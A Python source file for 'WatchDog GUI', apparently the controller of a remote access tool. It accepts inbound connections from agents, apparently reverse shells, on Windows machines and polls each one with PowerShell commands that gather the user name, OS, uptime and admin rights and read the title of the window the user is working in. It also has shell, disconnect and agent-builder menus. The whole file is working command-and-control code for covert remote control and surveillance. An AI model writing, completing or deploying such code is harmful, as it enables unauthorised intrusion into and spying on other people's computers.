import glfw
import imgui
from imgui.integrations.glfw import GlfwRenderer

import time
import socket
import threading
from datetime import datetime


        

class WatchDog:
    def __init__(self):
        self.Version = "0.1.0"
        self.WindowTitle = f"WatchDog GUI {self.Version}"
        self.WindowSize = (900, 450)

        self.running = True
        self.isListening = False

        self.socket_timeout_Server = 5
        self.socket_timeout_clients = 5

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(self.socket_timeout_Server)

        lo = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        lo.connect(("8.8.8.8", 80))

        self.IP = lo.getsockname()[0]
        self.PORT = 5050

        self.data_logs = []

        self.headers = ["IP", "Assigned Name", "Computer User", "OS", "Uptime", "Active Window", "Admin Privileges"]

        self.data_clients = [
            # [0, "192.168.10.141", "Alpha", "John-PC", "Windows 10", "2h 15m", "Chrome", "False"]
        ]

        self.window = self._init_glfw_window()
        imgui.create_context()
        self.impl = GlfwRenderer(self.window)



    def _init_glfw_window(self):
        if not glfw.init():
            raise RuntimeError("Could not initialize OpenGL context")

        glfw.window_hint(glfw.CONTEXT_VERSION_MAJOR, 3)
        glfw.window_hint(glfw.CONTEXT_VERSION_MINOR, 3)
        glfw.window_hint(glfw.OPENGL_PROFILE, glfw.OPENGL_CORE_PROFILE)
        glfw.window_hint(glfw.OPENGL_FORWARD_COMPAT, True)

        window = glfw.create_window(self.WindowSize[0], self.WindowSize[1], self.WindowTitle, None, None)
        glfw.make_context_current(window)
        return window
    



    def TabConnections(self):
        imgui.columns(7, "tree_columns")
        imgui.set_column_width(0, 120)
        imgui.set_column_width(1, 110)
        imgui.set_column_width(2, 150)
        imgui.set_column_width(3, 120)
        imgui.set_column_width(4, 120)
        imgui.set_column_width(5, 120)
        imgui.set_column_width(6, 200)

        for header in self.headers:
            imgui.text(header)
            imgui.next_column()
        imgui.separator()


        for i, row in enumerate(self.data_clients):
            is_hovered = False
            for j, cell in enumerate(row[1:]):
                imgui.text(cell)
                if imgui.is_item_hovered():
                    is_hovered = True
                imgui.next_column()

            if is_hovered and imgui.is_mouse_clicked(imgui.MOUSE_BUTTON_RIGHT):
                imgui.open_popup(f"context_menu_row_{i}")

            if imgui.begin_popup(f"context_menu_row_{i}"):
                if imgui.menu_item("Shell")[0]:
                    
                    imgui.end_popup()
                    break
                if imgui.menu_item("Disconnect")[0]:
                    self.SendMessage(i, "exit")
                    self.data_clients.pop(i)
                    imgui.end_popup()
                    break
                imgui.end_popup()

        imgui.columns(1)
        # imgui.end_tab_item()



    def TabLocalSettings(self):
        imgui.text("IP:  ")
        imgui.same_line()
        imgui.input_text("##ip", self.IP)
        imgui.text("PORT:")
        imgui.same_line()
        imgui.input_int("##port", self.PORT)

        if not self.isListening:
            if imgui.button("Start Server"):
                self.StartUpServer()
        else:
            if imgui.button("Stop Server") and self.isListening:
                self.StopServer()


    

    def DrawButtonText(self):
        """imgui.set_cursor_pos_y(imgui.get_window_height() - 20)
        imgui.text(f"Listening: {self.isListening}")"""
    



    def DrawLogs(self):
        for pp in self.data_logs:
            imgui.text(pp)




    def MenuTabs(self):
        imgui.set_next_window_size(self.WindowSize[0], self.WindowSize[1]+21)
        imgui.set_next_window_position(0, -21)
        imgui.begin("Main Window")

        if imgui.begin_tab_bar("Tabs"):
            if imgui.begin_tab_item("Connections")[0]:
                # imgui.text("Connections...")
                self.TabConnections()
                imgui.end_tab_item()
            if imgui.begin_tab_item("Local Settings")[0]:
                # imgui.text("Local Settings...")
                self.TabLocalSettings()
                imgui.end_tab_item()    
            if imgui.begin_tab_item("Agent Builder")[0]:
                imgui.text("Agent Builder...")
                imgui.end_tab_item()
            if imgui.begin_tab_item("Log")[0]:
                # imgui.text("Log...")
                self.DrawLogs()
                imgui.end_tab_item()
            if imgui.begin_tab_item("About")[0]:
                imgui.text("About...")
                imgui.end_tab_item()
            
            imgui.end_tab_bar()

        self.DrawButtonText()

        imgui.end()





    
    def StartUpServer(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(self.socket_timeout_Server)

        self.s.bind((self.IP, self.PORT))
        self.s.listen()

        self.isListening = True

        self.AddLogs(f"Start Server: {self.IP}:{self.PORT}")


    def StopServer(self):
        self.s.close()

        self.isListening = False

        self.AddLogs(f"Stop Server...")




    
    def ListeningForClients(self):
        while self.running:
            if self.isListening:
                try:
                    try:
                        conn, addr = self.s.accept()
                        conn.settimeout(self.socket_timeout_clients)  # 2 seconds timeout
                        # self.data_clients.append([conn, addr[0], "Alpha", "John-PC", "Windows 10", "2h 15m", "Chrome", "False"])
                        self.data_clients.append([conn, addr[0], "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"])
                        self.AddLogs(f"Client Connect: {addr[0]} PORT: {addr[1]}")
                        
                    except socket.timeout:
                        pass
                except:
                    pass
            else:
                time.sleep(2)



    
    def PingEveryClients(self):
        ping_time = time.time()

        while self.running:
            if self.isListening:

                # if (time.time() - ping_time) > 1:
                ping_time = time.time()
                    # print("ping")

                for i in range(len(self.data_clients)):
                    if not self.cmd_test_connection(i):
                        self.AddLogs(f"Client Lost connect: {self.data_clients[i][1]}")
                        self.data_clients.pop(i)
                    else:
                        self.data_clients[i][3] = self.Windows_cmd_WhoAmI(i)
                        self.data_clients[i][4] = self.Windows_cmd_OS_name(i)
                        self.data_clients[i][5] = self.Windows_cmd_Uptime(i)
                        self.data_clients[i][6] = self.Windows_cmd_get_activeWindow(i)
                        self.data_clients[i][7] = self.Windows_cmd_Check_Privileges(i)

            time.sleep(1)





    def SendMessage(self, index, message):
        try:
            try:
                self.data_clients[index][0].send(bytes(message, "utf-8"))
            except socket.timeout:
                pass
        except:
            pass

    
    def GetMessage(self, index, messagesize):
        try:
            try:
                data = self.data_clients[index][0].recv(messagesize).decode("utf-8")
                return data
            except socket.timeout:
                return 0
        except:
            return 0
        

    

    def cmd_test_connection(self, index):
        try:
            try:
                self.data_clients[index][0].send(bytes("Write-Output ''", "utf-8"))
                self.data_clients[index][0].recv(64).decode("utf-8")
                return 1
            except socket.timeout:
                return 0
        except:
            return 0




    def AddLogs(self, text):
        # print(f"{self.GetDataAndTime()} {text}")
        self.data_logs.append(f"{self.GetDataAndTime()} {text}")


    

    def GetDataAndTime(self):
        now = datetime.now()
        return now.strftime("[%Y-%m-%d %H:%M:%S]")
    



    def Windows_cmd_WhoAmI(self, i):
        self.data_clients[i][0].send(bytes("whoami", "utf-8"))
        rm = self.data_clients[i][0].recv(64).decode("utf-8")
        return rm[0:-2]
    
    def Windows_cmd_OS_name(self, i):
        self.data_clients[i][0].send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
        rm = self.data_clients[i][0].recv(64).decode("utf-8")
        return rm[0:-2]
    

    def Windows_cmd_Uptime(self, i):
        self.data_clients[i][0].send(bytes("(New-TimeSpan -Start (Get-CimInstance -ClassName win32_operatingsystem).LastBootUpTime).ToString()", "utf-8"))
        rm = self.data_clients[i][0].recv(64).decode("utf-8")
        return rm[0:-10]
    
    def Windows_cmd_Check_Privileges(self, i):
        self.data_clients[i][0].send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
        rm = self.data_clients[i][0].recv(16).decode("utf-8")
        return rm[0:-2]
    
    def Windows_cmd_get_activeWindow(self, i):
        command = """Add-Type -TypeDefinition "using System; using System.Text; using System.Runtime.InteropServices; public class ActiveWindow { [DllImport(`"user32.dll`")] public static extern IntPtr GetForegroundWindow(); [DllImport(`"user32.dll`")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count); }"; $h=[ActiveWindow]::GetForegroundWindow(); $sb=New-Object System.Text.StringBuilder 256; [void][ActiveWindow]::GetWindowText($h,$sb,$sb.Capacity); $sb.ToString()"""
        self.data_clients[i][0].send(bytes(command, "utf-8"))
        rm = self.data_clients[i][0].recv(128).decode("utf-8")
        return rm[0:-2]


    

    def start(self):
        threading.Thread(target=self.ListeningForClients).start()
        threading.Thread(target=self.PingEveryClients).start()

        while not glfw.window_should_close(self.window):
            glfw.poll_events()
            self.impl.process_inputs()
            imgui.new_frame()

            self.MenuTabs()

            imgui.render()
            self.impl.render(imgui.get_draw_data())
            glfw.swap_buffers(self.window)

        self.impl.shutdown()
        glfw.terminate()

        self.running = False
        self.isListening = False



if __name__ == "__main__":
    WatchDog().start()
